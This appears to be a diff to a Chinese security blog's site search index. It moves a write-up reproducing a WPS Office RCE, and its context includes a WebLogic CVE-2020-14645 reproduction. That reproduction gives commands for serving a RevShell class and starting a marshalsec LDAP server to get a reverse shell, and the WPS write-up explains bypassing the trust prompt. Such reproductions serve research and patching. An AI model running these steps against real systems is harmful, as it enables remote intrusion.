@@ -518,6 +518,13 @@ var relearn_search_index = [
     "uri": "/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"
   },
   {
+    "content": "摘要 WPS Office 软件是由金山办公软件股份有限公司自主研发的一款办公软件套装，可以实现办公软件最常用的文字、表格、演示等多种功能，覆盖 Windows、 macos、 Linux、 Android、 IOS及鸿蒙等平台。目前该漏洞已修复，请升级至最新版本。\n准备 准备个低版本wps，13703 win10 环境 原poc的说明： 需要将在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的） 127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn\n漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，也可以使用clientweb.docer.wps.cn.hellowps.cn.\n配置host，C:\\Windows\\System32\\drivers\\etc\\host，增\n127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn 漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，也可以使用clientweb.docer.wps.cn.hellowps.cn. 配置监听 注意：要在1.html目录下进行监听\ncd C:\\Users\\IEUser\\Desktop\\poc python -m http.server 80 点击触发漏洞。 由于加载了恶意shellcode html因此命令执行成功。 影响： 随后程序崩溃 分析： 我们可以看到这是在wps中插入了动态图表，而图表可以对应的链接被我们篡改了解析地址，造成了问题。\n这里有个现象，如果把这个图表放到最小那么点击的时候他是不用经过信任不信任选项，就默认会跳转的。所以poc是把这个缩小到最小，就是为了方便点击之后不用点击信任按钮，造成直接跳转。\n在这里我们可以看到实际上在原有功能上如果可以加载指定内容的类似超链接、图片等内容的，由于修改了host实际上相当于更换了服务器，也就自然可以换成攻击者的服务器，对应的html执行的命令也就可以不局限于弹计算器。\n修复建议 如果您在使用 WPS Office 个人版，您可以通过WPS 官网 https://www.wps.cn 获取最新版本进行升级。\n不受影响软件名称及版本：\nwps个人版大于12.1.0.15120，wps机构版/专业版/专业增强版大雨11.8.2.12055。\n参考资料 金山办公安全应急响应中心 (wps.cn)\n",
+    "description": "",
+    "tags": null,
+    "title": "WPSSRC-2023-0701金山WPS_RCE",
+    "uri": "/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WPSSRC-2023-0701%E9%87%91%E5%B1%B1WPS_RCE/index.html"
+  },
+  {
     "content": "影响版本 Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core). 受影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 以及 14.1.1.0.0. 影响：简单的漏洞利用即可允许攻击者通过IIOP未授权访问Oracle WebLogic T3。攻击者可利用漏洞接管网站。 CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n环境搭建 docker pull z1du/weblogic12214jdk8u181 windows10 https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html12\n漏洞验证 工具准备： git clone git@github.com:mbechler/marshalsec.git mvn clean package -DskipTests\n漏洞poc测试 通过nmap检测版本\nnmap -n -v -Pn –sV IP地址 -p 端口 --script=/usr/share/nmap/scripts/weblogic-t3-info.nse PORT STATE SERVICE 7001/tcp open afs3-callback |_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.4) 测试RCE rce编译 编译： RevShell.java 编译class文件 javac RevShell.java\n开启http服务，挂在class文件\npython3 -m http.server 5001访问本地http://192.168.31.102:5001/RevShell.class 200，可访问挂载成功\n配置开启LDAP服务 java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec. [-a] [-v] [-t] [\u003cgadget_type\u003e [\u003carguments…\u003e]] java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.31.102:5001/#RevShell 1099 rce 命令执行 java -jar CVE-2020-14645.jar 192.168.31.102:1099/#RevShell http://test.com:7001 Weblogic version: 12.2.1.4 反弹shell ",
     "description": "",
     "tags": "红蓝对抗,漏洞复现",
@@ -1006,13 +1013,6 @@ var relearn_search_index = [
     "tags": null,
     "title": "WinHEX(win)",
     "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEXwin/index.html"
-  },
-  {
-    "content": "摘要 WPS Office 软件是由金山办公软件股份有限公司自主研发的一款办公软件套装，可以实现办公软件最常用的文字、表格、演示等多种功能，覆盖 Windows、 macos、 Linux、 Android、 IOS及鸿蒙等平台。目前该漏洞已修复，请升级至最新版本。\n准备 准备个低版本wps，13703 win10 环境 原poc的说明： 需要将在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的） 127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn\n漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，也可以使用clientweb.docer.wps.cn.hellowps.cn.\n配置host，C:\\Windows\\System32\\drivers\\etc\\host，增\n127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn 漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，也可以使用clientweb.docer.wps.cn.hellowps.cn. 配置监听 注意：要在1.html目录下进行监听\ncd C:\\Users\\IEUser\\Desktop\\poc python -m http.server 80 点击触发漏洞。 由于加载了恶意shellcode html因此命令执行成功。 影响： 随后程序崩溃 分析： 我们可以看到这是在wps中插入了动态图表，而图表可以对应的链接被我们篡改了解析地址，造成了问题。\n这里有个现象，如果把这个图表放到最小那么点击的时候他是不用经过信任不信任选项，就默认会跳转的。所以poc是把这个缩小到最小，就是为了方便点击之后不用点击信任按钮，造成直接跳转。\n在这里我们可以看到实际上在原有功能上如果可以加载指定内容的类似超链接、图片等内容的，由于修改了host实际上相当于更换了服务器，也就自然可以换成攻击者的服务器，对应的html执行的命令也就可以不局限于弹计算器。\n修复建议 如果您在使用 WPS Office 个人版，您可以通过WPS 官网 https://www.wps.cn 获取最新版本进行升级。\n不受影响软件名称及版本：\nwps个人版大于12.1.0.15120，wps机构版/专业版/专业增强版大雨11.8.2.12055。\n参考资料 金山办公安全应急响应中心 (wps.cn)\n",
-    "description": "",
-    "tags": null,
-    "title": "WPSSRC-2023-0701金山WPS_RCE",
-    "uri": "/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WPSSRC-2023-0701%E9%87%91%E5%B1%B1WPS_RCE/index.html"
   },
   {
     "content": "windows下回收站文件 查询回收站内容 通过$RECYCLE.BIN+sid查询回收站内容。可以看到查到的文件名称展示都非原始文件名。\n通过dir /s /a c:$Recycle.Bin列出所有回收站中的文件，这里测试发现，当前用户的这个回收站展示的文件名并非原始文件名，而是经过重命名的文件。\n快速打开回收站：\nstart shell:RecycleBinFolder\nlinux下回收站文件 linux下回收站的位置 ~/.local/share/Trash/\nsudo ls -l ~/.local/share/Trash/file* # 列出所有回收站的文件 sudo rm -rf ~/.local/share/Trash/* # 删除回收站的文件",
